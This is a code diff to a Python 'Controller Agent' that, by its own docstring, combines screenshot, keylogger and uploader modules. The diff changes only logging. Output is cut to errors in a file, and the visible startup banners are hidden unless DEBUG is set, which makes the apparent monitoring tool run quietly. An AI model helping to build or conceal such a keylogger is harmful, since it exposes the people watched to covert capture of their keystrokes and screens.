@@ -7,6 +7,7 @@ Integrates all modules: config, screenshot, keylogger, uploader.
 
 import atexit
 import logging
+import logging.handlers
 import os
 import random
 import signal
@@ -24,15 +25,34 @@ from dotenv import load_dotenv
 load_dotenv()
 
 # Configure logging
+# Production: ERROR only, file only
+# Debug: INFO, console + file
+DEBUG = os.getenv('DEBUG', 'False').lower() == 'true'
+log_level = logging.INFO if DEBUG else logging.ERROR
+
+handlers = [
+    logging.handlers.RotatingFileHandler(
+        'agent.log', 
+        maxBytes=5*1024*1024, 
+        backupCount=2, 
+        encoding='utf-8'
+    )
+]
+
+if DEBUG:
+    handlers.append(logging.StreamHandler(sys.stdout))
+
 logging.basicConfig(
-    level=logging.INFO,
+    level=log_level,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.StreamHandler(),
-        logging.FileHandler('agent.log', encoding='utf-8')
-    ]
+    handlers=handlers
 )
 logger = logging.getLogger(__name__)
+
+if DEBUG:
+    logger.info("="*60)
+    logger.info("Controller Agent starting (DEBUG MODE)...")
+    logger.info("="*60)
 
 
 class ControllerAgent:
@@ -414,9 +434,10 @@ class ControllerAgent:
     
     def start(self):
         """Start the agent."""
-        logger.info("=" * 60)
-        logger.info("Controller Agent starting...")
-        logger.info("=" * 60)
+        if DEBUG:
+            logger.info("=" * 60)
+            logger.info("Controller Agent starting...")
+            logger.info("=" * 60)
         
         try:
             # Initialize core
@@ -456,9 +477,10 @@ class ControllerAgent:
             # Apply initial feature toggles
             self._apply_feature_toggles()
             
-            logger.info("=" * 60)
-            logger.info("Controller Agent running. Press Ctrl+C to stop.")
-            logger.info("=" * 60)
+            if DEBUG:
+                logger.info("=" * 60)
+                logger.info("Controller Agent running. Press Ctrl+C to stop.")
+                logger.info("=" * 60)
             
             # Main loop
             while self._running:
